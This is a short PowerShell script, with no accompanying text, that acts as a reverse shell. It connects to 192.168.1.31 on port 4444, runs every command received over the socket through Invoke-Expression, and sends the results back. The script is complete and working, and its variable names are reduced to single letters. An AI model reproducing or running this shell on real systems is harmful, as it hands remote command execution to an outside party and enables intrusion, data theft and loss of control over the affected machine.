$a = "192.168.1.31"; $b = 4444; $c = New-Object Net.Sockets.TCPClient($a,$b); 
$d = $c.GetStream(); $e = New-Object IO.StreamReader($d); 
$f = New-Object IO.StreamWriter($d); $f.AutoFlush = $true; 
$g = New-Object System.Byte[] 1024; 
while($c.Connected) {
    while($d.DataAvailable) {
        $h = $d.Read($g, 0, $g.Length); 
        $i = ([Text.Encoding]::UTF8).GetString($g, 0, $h - 1);
    }; 
    if($c.Connected -and $i.Length -gt 1) { 
        $j = try { Invoke-Expression ($i) 2>&1 } catch { $_ }; 
        $f.Write("$j`n"); 
        $i = $null; 
    }; 
}; 
$c.Close(); 
$d.Close(); 
$e.Close(); 
$f.Close();